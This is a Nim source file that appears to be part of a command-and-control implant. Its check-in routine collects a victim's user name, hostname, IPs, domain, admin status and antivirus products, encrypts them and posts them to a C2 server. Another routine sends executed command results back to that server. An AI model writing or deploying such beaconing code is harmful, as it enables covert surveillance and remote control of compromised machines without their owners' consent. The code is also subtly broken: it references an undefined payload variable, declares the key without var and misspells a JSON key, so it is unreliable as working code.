import httpclient, json, strformat
import config, crypto
import times
import std/parseutils

let client = newHttpClient()

proc sendCheckin*(id: string): string =
    let checkin_payload = %*{
      "id": id, #agent's id
      "user": getUserName(),
      "hostname": getHostname(), #name of the host in whcih the agent is residing
      "os_version": getOSVersion(),
      "os_build": getOSBuild(),
      "architecture": getArchitecture(),
      "process_id": getProcessID(),
      "process_name": getProcessName(),
      "internal_ip": getInternalIP(),
      "external_ip": getExternalIP(),
      "domain": getDomain(),
      "is_admin": isAdmin(),
      "av_products": getAVProducts(),
      "beacon_start_time":  beacon_start_time,
      "first_checkin": now(),
      "implant_version": IMPLANT_VERSION,
      "beacon_key": PER_BEACON_KEY,
      "timestamp": now() #like last seen or last activity
    }

    key : seq[byte]

    #if now() > checkin_payload["first_checkin"]:
      #key = hexToBytes(PER_BEACON_KEY)
    #else:
      #key = hexToBytes(AES_KEY)

    key = hexToBytes(AES_KEY)

    let enc = encryptJson($payload, key)
    return client.postContent(C2_URL & CHECKIN_URI, enc) #post request http://127.0.0.1:8080/checkin with enc as body
    #in backend getNextTask(id) -> return the task for the agent as (task_id,cmd)

proc sendTaskResult*(id: string, task_id: string,command: string,result: string): string =
    let payload = %*{
      "agent_id": id,
      "task_id": task_id,
      "command": command,
      "data": result
    }
    let enc = encryptJson($payload, hexToBytes(AES_KEY))
    return client.postContent(C2_URL & RESULT_URI, enc)

type Task = object
    task_id: string
    command: string

proc parseTask*(raw: string): Task =
    let j = parseJson(raw)
    #j["task_id"]
    result.task_id = j["task_id"].getStr()
    result.command = j["commad"].getStr()
